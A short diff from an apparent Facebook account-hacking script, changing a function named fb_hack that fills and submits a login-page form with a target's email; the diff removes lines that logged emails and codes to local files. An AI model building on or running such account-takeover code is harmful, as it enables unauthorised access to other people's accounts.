@@ -68,16 +68,6 @@ def fb_hack(email, codex):
   try:
     browser.select_form(nr=0)
   except:
-    with open("emails.txt", "a") as f:
-        f.write(str(email))
-        f.close()
-    with open("passcoder.txt", "a") as z:
-        z.write(str(codex))
-        z.close()
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
-    y = reset
     raise
   browser.form['email'] = email
   browser.submit()
